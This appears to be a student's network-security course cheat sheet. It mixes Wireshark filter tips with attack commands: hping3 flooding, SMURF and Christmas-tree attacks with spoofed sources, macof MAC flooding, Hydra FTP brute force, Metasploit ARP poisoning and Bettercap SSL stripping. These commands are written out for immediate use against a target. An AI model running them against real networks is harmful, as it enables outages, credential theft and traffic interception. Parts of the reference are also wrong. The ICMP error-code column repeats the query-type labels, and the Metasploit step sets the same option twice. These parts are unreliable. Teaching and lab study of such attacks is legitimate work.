**Instructor: Dimitris Amprazis**

#### Types of Attacks:
1. [ARP Cache Poisoning / Spoofing](#arp-cache-poisoning--spoofing-w-metasploit)
1. [SMURF Attack / ICMP Flooding / IP Spoofing](#hping-commands)
1. [Denial of Service / DoS Attack](#hydra-command)
1. [Christmas Tree Attack](#hping-commands)
1. [Brute Force Attack](#hydra-command)
1. [MAC Flooding](#macof-commands)
1. [SSL Stripping](#ssl-stripping)

---

#### Wireshark Utils:
- Comparison: 
    - source ip filter: `ip.src==216.58.198.14`
    - destination ip filter: `ip.dst==192.168.1.49`
    - `tcp.port eq 80`
    - `ip.dst != 192.168.1.1`
- Boolean filter: `http||arp`
- Boolean & Comparison filter combination: `http&&ip.src==95.100.242.40`
- Filter lost TCP Segment filter: `tcp.analysis.lost_segment`
- Filter TCP latency above n second: `tcp.time_delta > n`
- Filter Retransmitted TCP Segment: `tcp.analysis.retransmission`
- Filter a frame that contains a specific text: `frame contains username123`
- Show suspicious traffic (if any): `Analyze > Expert Information > Severity:Warning`
- Filter Specific http methods: `http.request.method==POST`
- Filter all FTP Traffic: `ftp.request.command` 
- Filter all FTP Data Traffic: `ftp-data` 
- Filter all Telnet Traffic: `telnet` 
- Filter all SMTP Traffic: `smtp` 
- Filter all DNS Traffic: `dns` 
- Filter DNS Query Answers more than 4:
  > `dns.count.answers > 4` 
  > 
  > This is used for inspecting whether any zombie is present in a network and trying to connect to a C2 server, so on DNS resolving and an answer more than 4 we can suspect it to be a malicious url.
  >
  > Also using the PDU Hierarchical Viewer and under "**Domain Name System (response)**" for a selected DNS response packet we can see the field "**Answer RRs**" that shows the DNS Query Answers returned.
- View Protocol Hierarchy: 
  > `Statistics > Protocol Hierarchy`
  >
  > The above window shows a list of protocols that has been used to communicate.
  >
  > Mostly this is used to find any suspicious traffic especially in the TCP section when the segment is shown as **"Data"**.
  >
  > Wireshark does it because it doesn't what kind of payload is present inside its PDU(there could be false +ves).
- Filtering capture before scanning:
  > NOTE: The following steps might vary for every protocol but the procedure remains the same.
  - `Capture > Capture Filters >` Press <kbd>+</kbd> `> [SET THE NAME AND FILTER]`
  - `[INTERFACE SELECTION WINDOW] > [PRESS GREEN BOOKMARK BUTTON AND SELECT THE CREATED FILTER] > [DOUBLE CLICK INTERFACE]`
- Insert a key to decrypt captured packets: `Edit > Preferences > Protocols > [SELECT SPECIFIC PROTOCOL] > Decryption Keys [EDIT] >` Press <kbd>+</kbd> ` > [ADD KEY TYPE AND KEY]`. 
- Extract a binary file from TCP Stream:
  - `Right click contextual data packet from capture window > Follow > TCP Stream`
  - `Show and save data as > Raw > Save as`
- Kerberos Misc:
  - Filter user account names: `kerberos.CNameString and !(kerberos.CNameString contains $)`
  - View domain name: `PDU Hierarchical Viewer > Kerberos > as-req > req-body > cname > realm`
- List HTTP Objects: `File > Export Objects > HTTP`

---

#### Network Utilities:
- `netstat` - Print network connections, routing tables, interface stats, masquerade connections, multicast memberships
- `ss` - utility to investigate sockets

---

#### ICMP / Ping / Host Discovery Utils:

  > **NOTE**:
  > - ICMP Payload size is 32 Bytes
  > - ICMP MTU is 1472 bytes. Beyond that packet is fragmented

  - **Ping Util**:
    > **Normal Ping Requests** - `ping 192.168.1.2`
    >
    > **Ping Requests with hostname resolution** - `ping -a 192.168.1.2`
    >
    > **Ping n number of packets** - `ping -n 8 192.168.1.2`
    >
    > **Fragment Ping packet** - `ping -l 33 192.168.1.2`
    >
    > **Netdiscover Ping Scan** - `netdiscover [-i <interface> [-r <ip_range>]]`

  - **ICMP Codes**:

    | Query Codes                       |      Error Codes                  |
    |-----------------------------------|-----------------------------------|
    | **Type 0** - Echo Reply           | **Type 3** - Echo Reply           |
    | **Type 8** - Echo Request         | **Type 4** - Echo Request         |
    | **Type 9** - Router Advertisement | **Type 5** - Router Advertisement |
    | **Type 10** - Router Solicitation | **Type 11** - Router Solicitation |
    | **Type 13** - Timestamp Request   | **Type 12** - Timestamp Request   |
    | **Type 14** - Timestamp Reply

---

#### Hping Commands:

- Perform Christmas Tree Attack:
  > \> `hping3 <victim's_ip> --flood --rand-source --destport 80 -c 25000 --syn --ack --fin --rst --push --urg --xmas --ymas`

- Perform SMURF Attack / ICMP Flooding:
  > \> `hping3 --icmp --flood -a <spoofed_victim's_ip> <broadcast_ip>`

- Perform Denial of Service / DoS Attack:
  > \> `hping3 -c <no_of_packets_to_send> -d <packet_size> -S -w <tcp_window_size> -p <port_no> --flood --randsource <target's_ip>`

---

#### macof Commands:
- Simple MAC Flooding: `macof -i <interface_name> [-n <int>]`
- Targeted MAC Flooding: `macof -i <interface_name> -d <target's_ip>`

---

#### Hydra Command:
- Perform Brute force on FTP:
  > `hydra -L <username_lists.txt> -P <passwd_lists.txt> [-vV] <target's_ip> ftp`

---

#### ARP Cache Poisoning / Spoofing (/w Metasploit):

- use the following aux module:
  >msf > `use auxiliary/spoof/arp/arp_poisoning`

- set the **target's** & **gateway's** ip address:
  >msf > `set DHOSTS <target's_ip>`
  >
  >msf > `set DHOSTS <gateway's_ip>`

- run the command:
  >msf > `exploit`

---

#### SSL Stripping (/w Bettercap):
> AKA SSL downgrade or HTTP downgrade attacks which is a type of cyber attack where hackers downgrade a web connection from the more secure **HTTPS** to the less secure **HTTP**. This makes all communications unencrypted and sets the stage for a man-in-the-middle attack, in which the hacker sits in the middle of a conversation listening or intercepting information.

To perform SSL Stripping we'll be using **Bettercap** as follows:
> $ `bettercap -iface eth0`
>
> \>\> `set http.proxy.sslstrip true`
>
> \>\> `set net.probe on`
>
> \>\> `set net.sniff on`
>
> \>\> `arp.spoof on`

> **NOTE: SSL Stripping won't work on cached URLs, and when HSTS is enabled**

---

#### Extras:
- Tor Communcations can't be monitored in Wireshark instead we can use **[NetworkMiner](https://www.netresec.com/?page=NetworkMiner)**. Also the capture data shown is much more jargonless.
